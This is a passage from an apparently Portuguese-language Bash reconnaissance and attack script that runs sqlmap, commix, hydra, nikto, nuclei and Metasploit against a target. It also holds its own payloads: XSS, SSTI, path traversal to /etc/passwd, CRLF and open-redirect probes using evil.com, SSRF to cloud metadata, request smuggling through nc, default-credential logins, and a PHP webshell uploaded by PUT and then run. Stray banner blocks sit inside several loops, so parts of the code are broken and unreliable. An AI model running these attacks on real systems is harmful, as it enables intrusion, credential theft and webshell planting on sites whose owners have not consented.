          has_content=$(echo "$body" | grep -ciE "<html|<body|<form|<div|<input" 2>/dev/null)
          has_cookie=$(echo "$body" | grep -ci "set_cookie\|begetok\|location.reload" 2>/dev/null)
          [ "$has_content" -gt 2 ] && [ "$has_cookie" -eq 0 ] && critico "ACESSO LIVRE: $ALVO/$path (HTTP $body_code)"
          [ "$has_content" -gt 0 ] && [ "$has_cookie" -gt 0 ] && aviso "POSSIVEL FALSO POSITIVO: $ALVO/$path (so seta cookie)"
          [ "$has_content" -le 2 ] && [ "$has_cookie" -eq 0 ] && aviso "ACESSO LIVRE: $ALVO/$path (pouco conteudo)"
          ;;
        .git) echo "$body" | grep -qi "\[core\]" && critico "REPOSITORIO GIT EXPOSTO: $ALVO/$path" ;;
        .env) echo "$body" | grep -qi "DB_\|APP_\|SECRET\|PASSWORD\|KEY\|API" && critico "ARQUIVO .ENV EXPOSTO: $ALVO/$path" ;;
        wp-config.php.bak|wp-config.php~) echo "$body" | grep -qi "DB_NAME\|DB_USER\|DB_PASSWORD\|WP_\|define" && critico "BACKUP WP-CONFIG: $ALVO/$path" ;;
        dump.sql|database.sql) echo "$body" | grep -qi "CREATE TABLE\|INSERT INTO\|DROP TABLE\|--\|DELETE FROM" && critico "BACKUP BD: $ALVO/$path" ;;
        phpinfo.php|info.php|test.php|debug.php) echo "$body" | grep -qi "phpinfo\|PHP Version\|PHP License\|php version" && critico "INFO PHP EXPOSTA: $ALVO/$path" ;;
        crossdomain.xml) echo "$body" | grep -qi "allow-access-from" && aviso "CROSSDOMAIN.XML: $ALVO/$path permite acesso externo" ;;
        config) echo "$body" | grep -qi "DB_\|PASSWORD\|SECRET\|KEY\|HOST\|USER" && critico "CONFIG EXPOSTO: $ALVO/$path" ;;
        backup) echo "$body" | grep -qi "backup\|directory\|\.sql\|\.bak\|dump" && aviso "DIRETORIO DE BACKUP: $ALVO/$path" ;;
        *) echo "$body" | grep -qi "set_cookie\|begetok\|location.reload" && aviso "POSSIVEL FALSO POSITIVO: $ALVO/$path (so seta cookie)" || critico "ACESSO LIVRE: $ALVO/$path (HTTP $body_code)" ;;
      esac
    elif [ "$body_code" = "403" ]; then
      aviso "ACESSO RESTRITO: $ALVO/$path (HTTP $body_code)"
    elif [ "$body_code" = "401" ]; then
      aviso "AUTENTICACAO REQUERIDA: $ALVO/$path (HTTP $body_code)"
    fi
  fi
done
rm -f /tmp/.deeprecon_body 2>/dev/null
else
  aviso "Pulando arquivos sensiveis (sem porta web)"
fi

# ===== PASSOS 10+11+14+16+17+18 EM PARALELO =====
PAR_DIR=$(mktemp -d /tmp/.deeprecon_par_XXXX)

progresso "SQLMap - Testando SQL Injection" 2
{
  SQLI_TIMEOUT=120
  if [ "$WEB_ATIVO" = "1" ] && valida_ferramenta "sqlmap"; then
    PARAM=$(curl_rapido "$ALVO" 2>/dev/null | grep -oP '(?<=\?)[a-z]+(?==)' | head -1)
    SQLI_ACHOU=0
    if [ -n "$PARAM" ]; then
      info "Parametro GET: $PARAM (timeout ${SQLI_TIMEOUT}s)"
      SQLI_RESULT=$(timeout $SQLI_TIMEOUT sqlmap -u "${ALVO}?${PARAM}=1" --batch --level=2 --risk=2 --threads=5 --time-sec=2 --dbs 2>/dev/null || aviso "sqlmap GET falhou ou excedeu ${SQLI_TIMEOUT}s")
      echo "$SQLI_RESULT" | grep -qi "vulnerable" && critico "SQL INJECTION DETECTADA em ?$PARAM" && SQLI_ACHOU=1
    fi
    SQLI_FORMS=$(timeout $SQLI_TIMEOUT sqlmap -u "$ALVO" --crawl=1 --batch --forms --level=2 --risk=2 --threads=5 --time-sec=2 2>/dev/null || aviso "sqlmap forms falhou ou excedeu ${SQLI_TIMEOUT}s")
    echo "$SQLI_FORMS" | grep -qi "vulnerable" && critico "SQL INJECTION DETECTADA em formulario!" && SQLI_ACHOU=1
    COOKIE=$(curl_rapido -I "$ALVO" 2>/dev/null | grep -i "^set-cookie:" | head -1 | sed 's/.*: //' | cut -d';' -f1)
    if [ -n "$COOKIE" ]; then
      SQLI_COOKIE=$(timeout $SQLI_TIMEOUT sqlmap -u "$ALVO" --cookie="$COOKIE=1'" --batch --level=3 --risk=2 2>/dev/null || aviso "sqlmap cookie falhou ou excedeu ${SQLI_TIMEOUT}s")
      echo "$SQLI_COOKIE" | grep -qi "vulnerable" && critico "SQL INJECTION DETECTADA em cookie!" && SQLI_ACHOU=1
    fi
    [ "$SQLI_ACHOU" -eq 0 ] && info "Nenhuma SQL Injection encontrada nos testes basicos"
  fi
} > "$PAR_DIR/10.out" 2>&1 &
PID10=$!

progresso "Commix - Testando Command Injection" 2
{
  if [ "$WEB_ATIVO" = "1" ] && valida_ferramenta "commix"; then
    PARAM=$(curl_rapido "$ALVO" 2>/dev/null | grep -oP '(?<=\?)[a-z]+(?==)' | head -1)
    if [ -n "$PARAM" ]; then
      timeout 90 commix --url="${ALVO}?${PARAM}=1" --batch --level=1 2>/dev/null | grep -iE "vulnerable|injection|Confidence|Payload" | head -10 || aviso "commix falhou ou excedeu 90s"
    fi
  fi
} > "$PAR_DIR/11.out" 2>&1 &
PID11=$!

# Passo 12: FFUF (sequencial - rapido)
progresso "FFUF - Forca bruta de diretorios" 2
if [ "$WEB_ATIVO" = "1" ] && valida_ferramenta "ffuf" && verificar_conexao "$ALVO"; then
  if [ "$MODO" = "furtivo" ]; then
    WL=$(mini_wordlist)
    info "Modo furtivo: wordlist mini (50 paths)"
  else
    WL="/usr/share/wordlists/dirb/common.txt"
  fi
  if [ -f "$WL" ]; then
    (ffuf -u "$ALVO/FUZZ" -w "$WL" -t "$TOOL_THREADS" -c -s -fc 404,403 2>/dev/null || aviso "ffuf falhou") | head -40
  fi
fi

# Passo 13: WFuzz (sequencial - rapido)
progresso "WFuzz - Fuzzing de parametros" 2
if [ "$WEB_ATIVO" = "1" ] && [ "$MODO_SEGURO" != "1" ] && valida_ferramenta "wfuzz" && verificar_conexao "$ALVO"; then
  PARAM=$(curl_rapido "$ALVO" 2>/dev/null | grep -oP '(?<=\?)[a-z]+(?==)' | head -1)
  if [ -n "$PARAM" ]; then
    wl="/usr/share/wordlists/dirb/common.txt"
    [ "$MODO" = "furtivo" ] && wl=$(mini_wordlist) && info "Modo furtivo: wordlist mini"
    (wfuzz -c -z file,"$wl" -u "${ALVO}?FUZZ=1" --hc 404 2>/dev/null || aviso "wfuzz falhou") | head -15
  fi
else
  [ "$MODO_SEGURO" = "1" ] && info "WFuzz pulado pelo modo seguro"
fi

# Passo 13.5: Katana - Crawler moderno
progresso "Katana - Crawler de endpoints" 2
if [ "$WEB_ATIVO" = "1" ] && command -v katana &>/dev/null && verificar_conexao "$ALVO"; then
  katana -u "$ALVO" -d 2 -silent -jc -kf -c 20 2>/dev/null | head -80 || aviso "katana falhou"
fi

progresso "Nikto - Varredura de vulnerabilidades" 2
{
  if [ "$WEB_ATIVO" = "1" ] && valida_ferramenta "nikto" && verificar_conexao "$ALVO"; then
    nikto_opts="-timeout 10 -no404"
    [ "$MODO_SEGURO" = "1" ] && nikto_opts="$nikto_opts -nointeractive -nossl"
    [ "$PROTOCOLO" = "https" ] && [ "$MODO_SEGURO" != "1" ] && nikto_opts="$nikto_opts -ssl"
    nikto -h "$ALVO" $nikto_opts 2>/dev/null | grep -iE "OSVDB|vulnerable|vuln|click|XSS|SQL|path|disclosure|error|backup|interesting|account|upload|exec|shell|injection" | head -30 || aviso "nikto falhou"
    [ "$MODO_SEGURO" = "1" ] && aviso "Nikto em modo seguro - sem teste SSL, sem interacao com forms"
  fi
} > "$PAR_DIR/14.out" 2>&1 &
PID14=$!

# Passo 15: WPScan (sequencial - depende de whatweb)
progresso "WPScan - WordPress" 2
if [ "$WEB_ATIVO" = "1" ] && [ "$TEC_WP" = "1" ] && [ -n "$WHATWEB_OUT" ] && valida_ferramenta "wpscan"; then
  wpscan_token="${WPSCAN_API_TOKEN:-}"
  wpscan --url "$ALVO" --no-update ${wpscan_token:+--api-token "$wpscan_token"} 2>/dev/null | grep -iE "WordPress|theme|plugin|vulnerability|identified|User|admin" | head -15 || aviso "wpscan falhou"
elif [ "$TEC_WP" = "0" ]; then
  info "WPScan pulado - WordPress nao detectado"
elif [ -z "$WHATWEB_OUT" ]; then
  info "WPScan pulado - WhatWeb nao executou (tecnologia do alvo desconhecida)"
fi

# Passo 15.5: Nuclei (templates CVE)
progresso "Nuclei - Buscando CVEs" 2
if [ "$WEB_ATIVO" = "1" ] && valida_ferramenta "nuclei"; then
  safe_run "nuclei -u '$ALVO' -t cves,vulnerabilities -severity critical,high -nc -silent -c 20 2>/dev/null | head -20" "Nuclei" 90
fi

# Passo 15.6: HTTPX (probe rapido)
progresso "HTTPX - Validando servicos" 1
if [ "$WEB_ATIVO" = "1" ] && valida_ferramenta "httpx"; then
  safe_run "httpx -u '$ALVO' -status-code -title -tech-detect -silent -threads 20 2>/dev/null | head -10" "HTTPX" 30
fi

# Passos 16-18 em paralelo (DNS/local)
progresso "Hydra - Testando senhas (admin)" 2
{
  if [ "$WEB_ATIVO" = "1" ] && valida_ferramenta "hydra"; then
    if echo "$ALVO" | grep -qE 'login|admin|painel'; then
      hydra -t 4 -w 3 -l admin -P /usr/share/wordlists/fasttrack.txt "$DOMINIO" http-get / 2>/dev/null | head -10 || aviso "hydra falhou"
    fi
  fi
} > "$PAR_DIR/16hydra.out" 2>&1 &
PID16H=$!

progresso "DNSRecon - Info DNS" 2
{
  if valida_ferramenta "dnsrecon"; then
    dnsrecon -d "$DOMINIO" 2>/dev/null | grep -iE "A |AAAA|MX|NS|SOA|TXT" | head -15 || aviso "dnsrecon falhou"
  fi
} > "$PAR_DIR/16.out" 2>&1 &
PID16=$!

progresso "Whois - Info do dominio" 2
{
  if valida_ferramenta "whois"; then
    whois "$DOMINIO" 2>/dev/null | grep -iE "Registrant|Creation|Expir|Name Server|Owner" | head -10 || aviso "whois falhou"
  fi
} > "$PAR_DIR/17.out" 2>&1 &
PID17=$!

progresso "SearchSploit - Buscando exploits" 2
{
  if valida_ferramenta "searchsploit"; then
    SERVER=$(curl_rapido -I "$ALVO" 2>/dev/null | grep -i "^server:" | sed 's/.*: //')
    [ -n "$SERVER" ] && searchsploit "$SERVER" 2>/dev/null | grep -i "vulnerability\|exploit" | head -10 || aviso "searchsploit falhou"
  fi
} > "$PAR_DIR/18.out" 2>&1 &
PID18=$!

# Aguarda todos os passos paralelos
wait $PID10 $PID11 $PID14 $PID16 $PID16H $PID17 $PID18 2>/dev/null

# Exibe saidas na ordem
for num in 10 11 14 16hydra 16 17 18; do
  [ -f "$PAR_DIR/$num.out" ] && cat "$PAR_DIR/$num.out"
  rm -f "$PAR_DIR/$num.out" 2>/dev/null
done
rm -rf "$PAR_DIR" 2>/dev/null

# ===== PASSO 18.5: SUBDOMAIN TAKEOVER =====
progresso "Verificando subdomain takeover" 2
if command -v dig &>/dev/null && [ "$WEB_ATIVO" = "1" ]; then
  for sub in "${SCOPE_ALVOS[@]}"; do
    cname=$(dig +short CNAME "$sub" 2>/dev/null | head -1)
    [ -z "$cname" ] && continue
    echo "  $sub -> $cname"
    for takeover_pat in "s3.amazonaws.com" "cloudfront.net" "github.io" "herokuapp.com" "azurewebsites.net" "trafficmanager.net" "elasticbeanstalk.com" "firebaseio.com" "surge.sh" "unbounce.com" "wpengine.com" "myshopify.com" "helpshift.com" "uservoice.com" "zendesk.com" "freshdesk.com" "statuspage.io" "atlassian.net"; do
      if echo "$cname" | grep -qi "$takeover_pat"; then
        # Verifica se o servico responde (se nao responder, pode ser takeover)
        takeresponse=$(curl_rapido -o /dev/null -w "%{http_code}" --max-time 5 "http://$sub" 2>/dev/null)
        if [ "$takeresponse" = "404" ] || [ "$takeresponse" = "000" ]; then
          critico "SUBDOMAIN TAKEOVER: $sub ($cname) - servico nao encontrado (HTTP $takeresponse)"
        else
          aviso "POSSIVEL TAKEOVER: $sub aponta para $takeover_pat (code $takeresponse)"
        fi
      fi
    done
  done
fi

# ===== PASSO 19: METODOS HTTP =====
if [ "$WEB_ATIVO" = "1" ]; then
progresso "Verificando metodos HTTP" 2
curl_rapido -X OPTIONS -I -L "$ALVO" 2>/dev/null | grep -i "allow:" | head -5
PUT_CODE=$(curl_rapido -L -X PUT -d "test" "$ALVO/test.txt" -o /dev/null -w "%{http_code}" 2>/dev/null)
echo "$PUT_CODE" | grep -qE "200|201|204" && critico "Metodo PUT habilitado! (HTTP $PUT_CODE)"

# ===== PASSO 20: SERVICOS COMUNS =====
progresso "Procurando servicos comuns" 2
for srv in cgi-bin/ cgi-bin/test.cgi server-status server-info phpMyAdmin phpmyadmin phppgadmin adminer.php mysql phpinfo.php info.php; do
  body_code=$(curl_rapido -L --max-time 3 -o /tmp/.deeprecon_srv -w "%{http_code}" "$ALVO/$srv" 2>/dev/null)
  if [ "$body_code" = "200" ]; then
    body=$(cat /tmp/.deeprecon_srv 2>/dev/null)
    case "$srv" in
      phpMyAdmin|phpmyadmin) echo "$body" | grep -qi "phpmyadmin\|phpMyAdmin" && critico "SERVICO ENCONTRADO: $ALVO/$srv" ;;
      phppgadmin) echo "$body" | grep -qi "phppgadmin\|PostgreSQL" && critico "SERVICO ENCONTRADO: $ALVO/$srv" ;;
      adminer.php) echo "$body" | grep -qi "adminer\|Adminer" && critico "SERVICO ENCONTRADO: $ALVO/$srv" ;;
      phpinfo.php|info.php) echo "$body" | grep -qi "phpinfo\|PHP Version\|php version\|PHP License" && critico "SERVICO ENCONTRADO: $ALVO/$srv" ;;
      mysql) echo "$body" | grep -qi "mysql\|MySQL\|phpMyAdmin" && critico "SERVICO ENCONTRADO: $ALVO/$srv" ;;
      server-status) echo "$body" | grep -qi "server status\|Apache.*Server\|nginx.*status" && critico "SERVICO ENCONTRADO: $ALVO/$srv" ;;
      server-info) echo "$body" | grep -qi "server info\|Apache.*Server" && critico "SERVICO ENCONTRADO: $ALVO/$srv" ;;
      cgi-bin/test.cgi) echo "$body" | grep -qi "cgi\|content-type" && critico "SERVICO ENCONTRADO: $ALVO/$srv" ;;
    esac
  fi
# ============================================================

# ============================================================
echo ""
echo -e "${GREEN}${BOLD}╔══════════════════════════════════════════════════╗${RESET}"

done
rm -f /tmp/.deeprecon_srv 2>/dev/null

# ===== PASSO 21: CVE CHECK =====
progresso "Verificando versoes antigas" 2
SERVER=$(curl_rapido -I "$ALVO" 2>/dev/null | grep -i "^server:" | sed 's/.*: //')
echo "$SERVER" | grep -qi "apache/2\.[0123]\|apache/1\." && critico "Apache versao antiga!"
echo "$SERVER" | grep -qi "nginx/1\.[0-9]" && critico "Nginx versao antiga!"
echo "$SERVER" | grep -qi "php/5\.[0-6]" && critico "PHP versao antiga!"
echo "$SERVER" | grep -qi "iis/6\|iis/7" && critico "IIS versao antiga!"

# ===== PASSO 22: EXPLORACAO AGRESSIVA =====
progresso "Exploracao agressiva - testando invasao" 2
info "Testando XSS refleto..."
XSS_PAYLOADS=("<script>alert(1)</script>" "\"><script>alert(1)</script>" "'><script>alert(1)</script>")
for param in $(curl_rapido "$ALVO" 2>/dev/null | tr "'" '"' | grep -oP 'name="?\K[a-z_][a-zA-Z0-9_]*' | sort -u | head -5); do
  for payload in "${XSS_PAYLOADS[@]}"; do
    code=$(curl_rapido -o /dev/null -w "%{http_code}" --max-time 3 "${ALVO}?${param}=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))" 2>/dev/null)" 2>/dev/null)
    [ "$code" = "200" ] && aviso "Possivel XSS: $ALVO?$param=$payload"
  done
# ============================================================

# ============================================================
echo ""
echo -e "${GREEN}${BOLD}╔══════════════════════════════════════════════════╗${RESET}"

done

info "Testando path traversal..."
for path in "../../../etc/passwd" "../../etc/passwd" "../etc/passwd" "..\\..\\..\\windows\\win.ini"; do
  body=$(curl_rapido --max-time 3 "$ALVO/$path" 2>/dev/null)
  echo "$body" | grep -qi "root:\|\[extensions\]" && critico "PATH TRAVERSAL: $ALVO/$path expoe arquivos do sistema!"
# ============================================================

# ============================================================
echo ""
echo -e "${GREEN}${BOLD}╔══════════════════════════════════════════════════╗${RESET}"

done

info "Testando exposicao de .git..."
GIT_URL=$(curl_rapido --max-time 3 "$ALVO/.git/config" 2>/dev/null)
echo "$GIT_URL" | grep -qi "\[core\]" && critico "REPOSITORIO GIT EXPOSTO: $ALVO/.git/config baixavel!"

info "Testando exposicao de .env..."
ENV_CONTENT=$(curl_rapido --max-time 3 "$ALVO/.env" 2>/dev/null)
echo "$ENV_CONTENT" | grep -qi "DB_\|APP_\|SECRET\|PASSWORD\|KEY" && critico "ARQUIVO .ENV EXPOSTO com credenciais!"

info "Testando CORS misconfiguration..."
CORS_HEADER=$(curl_rapido -I -H "Origin: https://malicious.com" --max-time 3 "$ALVO" 2>/dev/null | grep -i "^access-control-allow-origin:")
echo "$CORS_HEADER" | grep -qi "malicious" && critico "CORS MISCONFIG: Access-Control-Allow-Origin reflete qualquer origem!"

info "Testando default credentials..."
for path in admin login wp-admin painel dashboard administrador; do
  SEM_AUTH=$(curl_rapido -L --max-time 3 -o /dev/null -w "%{http_code}" "$ALVO/$path" 2>/dev/null)
  COM_AUTH_ADMIN=$(curl_rapido -L --max-time 3 -u "admin:admin" -o /dev/null -w "%{http_code}" "$ALVO/$path" 2>/dev/null)
  COM_AUTH_ROOT=$(curl_rapido -L --max-time 3 -u "root:root" -o /dev/null -w "%{http_code}" "$ALVO/$path" 2>/dev/null)
  if [ "$SEM_AUTH" != "$COM_AUTH_ADMIN" ] && [ "$COM_AUTH_ADMIN" = "200" ]; then
    critico "DEFAULT CREDENTIALS: admin:admin funciona em $ALVO/$path!"
  fi
  if [ "$SEM_AUTH" != "$COM_AUTH_ROOT" ] && [ "$COM_AUTH_ROOT" = "200" ]; then
    critico "DEFAULT CREDENTIALS: root:root funciona em $ALVO/$path!"
  fi
# ============================================================

# ============================================================
echo ""
echo -e "${GREEN}${BOLD}╔══════════════════════════════════════════════════╗${RESET}"

done

info "Testando open redirect..."
REDIR_TEST=$(curl_rapido -L -o /dev/null -w "%{url_effective}" --max-time 3 "${ALVO}?redirect=http://evil.com&url=http://evil.com&next=http://evil.com&return=http://evil.com" 2>/dev/null)
echo "$REDIR_TEST" | grep -qvi "$DOMINIO" && [ -n "$REDIR_TEST" ] && critico "OPEN REDIRECT: redireciona para dominio externo ($REDIR_TEST)"

info "Testando SSTI (Server-Side Template Injection)..."
SSTI_PAYLOADS=("{{7*7}}" "\${7*7}" "<%= 7*7 %>" "#{7*7}" "*{7*7}")
for payload in "${SSTI_PAYLOADS[@]}"; do
  SSTI_RESULT=$(curl_rapido --max-time 3 "${ALVO}?name=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))" 2>/dev/null)" 2>/dev/null)
  echo "$SSTI_RESULT" | grep -q "49" && aviso "Possivel SSTI: $ALVO?name=$payload (retornou 49)"
# ============================================================

# ============================================================
echo ""
echo -e "${GREEN}${BOLD}╔══════════════════════════════════════════════════╗${RESET}"

done

info "Testando upload de webshell via PUT..."
PUT_TEST=$(curl_rapido -L -X PUT -d "<?php system(\$_GET['cmd']); ?>" "$ALVO/shell.php" -o /dev/null -w "%{http_code}" 2>/dev/null)
if [ "$PUT_TEST" = "200" ] || [ "$PUT_TEST" = "201" ] || [ "$PUT_TEST" = "204" ]; then
  critico "WEBSHELL UPLOAD: PUT $ALVO/shell.php funcionou! ($PUT_TEST)"
  CHECK_SHELL=$(curl_rapido -L --max-time 3 "$ALVO/shell.php?cmd=id" 2>/dev/null)
  echo "$CHECK_SHELL" | grep -qi "uid=" && critico "WEBSHELL ACESSAVEL: $ALVO/shell.php?cmd=id"
fi

info "Verificando phpinfo exposto..."
PHPINFO=$(curl_rapido --max-time 3 "$ALVO/phpinfo.php" 2>/dev/null)
echo "$PHPINFO" | grep -qi "PHP Version\|phpinfo()" && critico "PHPINFO EXPOSTO: $ALVO/phpinfo.php vaza configuracoes do PHP!"

info "Verificando backup files expostos..."
for bak in .bak .old .swp ~ .save backup.sql dump.sql db.sql config.php.bak; do
  BAK_CODE=$(curl_rapido -o /dev/null -w "%{http_code}" --max-time 3 "$ALVO/config.php$bak" 2>/dev/null)
  [ "$BAK_CODE" = "200" ] && critico "BACKUP EXPOSTO: $ALVO/config.php$bak"
# ============================================================

# ============================================================
echo ""
echo -e "${GREEN}${BOLD}╔══════════════════════════════════════════════════╗${RESET}"

done

# ===== PASSO 22.5: DALFOX - XSS AUTOMATICO =====
info "Dalfox - Varredura XSS automatizada..."
if [ "$WEB_ATIVO" = "1" ] && command -v dalfox &>/dev/null && verificar_conexao "$ALVO"; then
  dalfox url "$ALVO" --silence --no-color --depth 2 --delay 500 --only-poc -o /dev/null 2>/dev/null | head -20 || aviso "dalfox falhou"
fi

# ===== PASSO 22.6: CLOUD STORAGE DISCOVERY =====
progresso "Cloud Storage - S3 / Azure / GCP" 2
if [ "$WEB_ATIVO" = "1" ]; then
  base=$(echo "$DOMINIO" | sed -E 's/^www\.//' | cut -d. -f1)
  echo ""
  echo "=== Cloud Storage Discovery ==="
  # AWS S3
  for name in "$DOMINIO" "$base" "${base}-backup" "${base}-data" "${base}-dev" "${base}-prod" "${base}-storage" "${base}-assets" "${base}-uploads"; do
    s3code=$(curl_rapido -o /dev/null -w "%{http_code}" --max-time 5 "https://${name}.s3.amazonaws.com" 2>/dev/null)
    [ "$s3code" = "200" ] && critico "S3 BUCKET ACESSIVEL: https://${name}.s3.amazonaws.com"
  done
  # Azure Blob
  for name in "$DOMINIO" "$base" "${base}backup" "${base}data" "${base}dev"; do
    azcode=$(curl_rapido -o /dev/null -w "%{http_code}" --max-time 5 "https://${name}.blob.core.windows.net" 2>/dev/null)
    [ "$azcode" != "000" ] && [ "$azcode" != "404" ] && aviso "Azure Blob encontrado: ${name}.blob.core.windows.net (HTTP $azcode)"
  done
  # Firebase
  fbcode=$(curl_rapido -o /dev/null -w "%{http_code}" --max-time 5 "https://${base}.firebaseio.com/.json" 2>/dev/null)
  [ "$fbcode" = "200" ] && critico "FIREBASE EXPOSED: https://${base}.firebaseio.com/.json"
  # DigitalOcean Spaces
  docode=$(curl_rapido -o /dev/null -w "%{http_code}" --max-time 5 "https://${base}.nyc3.digitaloceanspaces.com" 2>/dev/null)
  [ "$docode" != "000" ] && [ "$docode" != "404" ] && aviso "DO Space: ${base}.nyc3.digitaloceanspaces.com (HTTP $docode)"
  echo "==============================="
fi

# ===== PASSO 22.7: RACE CONDITION =====
progresso "Race Condition - Requests simultaneos" 2
if [ "$WEB_ATIVO" = "1" ] && verificar_conexao "$ALVO"; then
  echo ""
  echo "=== Race Condition Check ==="
  for endpoint in "/" "/login" "/api" "/admin" "/reset" "/coupon" "/checkout"; do
    pids=()
    start=$(date +%s%N)
    for i in 1 2 3 4 5; do
      curl_rapido -L -o /dev/null -w "%{http_code}\n" --max-time 5 "$ALVO$endpoint" &
      pids+=($!)
    done
    wait "${pids[@]}" 2>/dev/null
    elapsed=$(( ($(date +%s%N) - start) / 1000000 ))
    echo "  $endpoint: $elapsed ms (5 requests)"
  done
  echo "==============================="
fi

# ===== PASSO 22.8: GRAPHQL INTROSPECTION =====
progresso "GraphQL - Introspection query" 2
if [ "$WEB_ATIVO" = "1" ]; then
  echo ""
  echo "=== GraphQL Introspection ==="
  INTRO_QUERY='{"query":"query { __schema { types { name kind description fields { name } } } }"}'
  for gql_endpoint in "/graphql" "/graphiql" "/v1/graphql" "/v2/graphql" "/api/graphql" "/gql" "/query" "/graph" "/explorer"; do
    gql_resp=$(curl_rapido -X POST -H "Content-Type: application/json" -d "$INTRO_QUERY" --max-time 5 "$ALVO$gql_endpoint" 2>/dev/null)
    if echo "$gql_resp" | grep -qi '"types"\|__schema\|__typename'; then
      critico "GRAPHQL INTROSPECTION ATIVO em $gql_endpoint!"
      echo "$gql_resp" | grep -oP '"name":"[^"]*"' | head -20
    fi
  done
  echo "==============================="
fi

# ===== PASSO 22.9: HTTP REQUEST SMUGGLING =====
progresso "HTTP Smuggling - CL.TE / TE.CL" 2
if [ "$WEB_ATIVO" = "1" ] && command -v nc &>/dev/null; then
  echo ""
  echo "=== Request Smuggling ==="
  for port in 80 443 8080 8443; do
    echo "  Testando porta $port..."
    # CL.TE: Content-Length + Transfer-Encoding chunked simultaneos
    smuggling_clte=$(echo -e "POST / HTTP/1.1\r\nHost: $DOMINIO\r\nContent-Length: 44\r\nTransfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: $DOMINIO\r\n\r\n" | timeout 5 nc "$ALVO_IP" "$port" 2>/dev/null)
    echo "$smuggling_clte" | grep -qi "admin\|200\|HTTP" && aviso "POSSIVEL SMUGGLING (CL.TE) na porta $port"
  done
  echo "==============================="
fi

# ===== PASSO 22.10: JS SECRETS SCANNING =====
progresso "JS Secrets - Regex em arquivos JS" 2
if [ "$WEB_ATIVO" = "1" ]; then
  echo ""
  echo "=== JS Secrets ==="
  # Baixa a pagina, extrai links .js, baixa cada um e procura secrets
  JS_PAGE=$(curl_rapido -L --max-time 10 "$ALVO" 2>/dev/null)
  JS_URLS=$(echo "$JS_PAGE" | grep -oP 'src="[^"]*\.js[^"]*"' | sed 's/src="//;s/"//' | head -15)
  for js in $JS_URLS; do
    js_url="$js"
    echo "$js" | grep -q "^http" || js_url="${PROTOCOLO}://${DOMINIO}/${js}" 2>/dev/null
    JS_CONTENT=$(curl_rapido -L --max-time 10 "$js_url" 2>/dev/null)
    [ -z "$JS_CONTENT" ] && continue
    # Procura por secrets
    for pat in 'api[Kk]ey' 'api_key' 'secret' 'sk_live_' 'sk_test_' 'ghp_' 'gho_' 'AKIA' '-----BEGIN' 'token' 'password' 'aws_access_key' 'AWS_SECRET' 'firebase' 'mongo' 'postgres' 'mysql://' 'redis://'; do
      found=$(echo "$JS_CONTENT" | grep -oiP ".{0,30}$pat.{0,30}" | head -10)
      [ -n "$found" ] && echo "$found" | while read -r line; do
        aviso "SECRET em $js_url: ...$line..."
      done
    done
  done
  echo "==============================="
fi

# ===== PASSO 22.11: GOWITNESS - SCREENSHOT =====
progresso "GoWitness - Screenshot do alvo" 2
if [ "$WEB_ATIVO" = "1" ] && command -v gowitness &>/dev/null; then
  mkdir -p "$REPORT_DIR/screenshots" 2>/dev/null
  gowitness scan single --url "$ALVO" --screenshot-path "$REPORT_DIR/screenshots/" 2>/dev/null || aviso "gowitness falhou"
  ls "$REPORT_DIR/screenshots/"*.* 2>/dev/null | head -1 | while read f; do info "Screenshot: $f"; done
fi

# ===== PASSO 22.12: CRLF INJECTION =====
progresso "CRLF Injection - Quebra de resposta" 2
if [ "$WEB_ATIVO" = "1" ]; then
  echo ""
  echo "=== CRLF Injection ==="
  for param in "redirect" "url" "next" "return" "redir" "page" "file" "load" "path" "dest"; do
    CRLF_CODE=$(curl_rapido -o /dev/null -w "%{http_code}" --max-time 5 "${ALVO}?${param}=http://evil.com%0d%0aX-Injected:%20true" 2>/dev/null)
    CRLF_HEADER=$(curl_rapido -I --max-time 5 "${ALVO}?${param}=http://evil.com%0d%0aX-Injected:%20true" 2>/dev/null)
    echo "$CRLF_HEADER" | grep -qi "X-Injected" && critico "CRLF INJECTION: ${param}=...%0d%0aX-Injected: true"
  done
  echo "==============================="
fi

# ===== PASSO 22.13: SSRF BASICO =====
progresso "SSRF - Testando acesso interno" 2
if [ "$WEB_ATIVO" = "1" ]; then
  echo ""
  echo "=== SSRF Check ==="
  for param in "url" "file" "load" "read" "path" "src" "href" "page" "redirect" "image" "img" "download" "fetch" "proxy" "host"; do
    resp=$(curl_rapido -L --max-time 5 "${ALVO}?${param}=http://169.254.169.254/latest/meta-data/" 2>/dev/null)
    echo "$resp" | grep -qi "instance-id\|ami-id\|iam\|role" && critico "SSRF DETECTADO: ${param}=http://169.254.169.254/latest/meta-data/ retornou dados!"
    resp=$(curl_rapido -L --max-time 5 "${ALVO}?${param}=http://127.0.0.1:22" 2>/dev/null)
    echo "$resp" | grep -qi "SSH\|OpenSSH\|refused\|banner" && aviso "POSSIVEL SSRF: ${param}=http://127.0.0.1:22"
  done
  echo "==============================="
fi

# ===== PASSO 22.14: WEBSOCKET DISCOVERY =====
progresso "WebSocket - Descobrindo endpoints" 2
if [ "$WEB_ATIVO" = "1" ]; then
  echo ""
  echo "=== WebSocket Discovery ==="
  WS_PORT="${PORTA:-80}"
  for ws_endpoint in "/ws" "/wss" "/socket.io" "/websocket" "/ws/v1" "/ws/chat" "/notifications" "/realtime" "/stream" "/ws/socket"; do
    for proto_ws in "ws" "wss"; do
      ws_url="${proto_ws}://${DOMINIO}${ws_endpoint}"
      ws_host=$(echo "$DOMINIO" | cut -d: -f1)
      timeout 2 bash -c "echo > /dev/tcp/$ws_host/$WS_PORT" 2>/dev/null && {
        aviso "Possivel WebSocket: $ws_url"
        break
      } || true
    done
  done
  echo "==============================="
fi

# ===== PASSO 23: METASPLOIT - SCANNERS AUXILIARES =====
progresso "Metasploit - Rodando scanners auxiliares" 2
if valida_ferramenta "msfconsole"; then
  MSF_RC=$(mktemp)
  DOMINIO_ESC=$(echo "$DOMINIO" | sed 's/\./\\./g')
  cat > "$MSF_RC" << EOM
use auxiliary/scanner/http/options
set RHOSTS $DOMINIO
set RPORT $PORTA
set THREADS 20
run

use auxiliary/scanner/http/robots_txt
set RHOSTS $DOMINIO
set RPORT $PORTA
run

use auxiliary/scanner/http/http_header
set RHOSTS $DOMINIO
set RPORT $PORTA
set THREADS 20
run

use auxiliary/scanner/http/verb_auth_bypass
set RHOSTS $DOMINIO
set RPORT $PORTA
set THREADS 20
run

use auxiliary/scanner/http/git_scanner
set RHOSTS $DOMINIO
set RPORT $PORTA
set THREADS 20
run

use auxiliary/scanner/http/host_header_injection
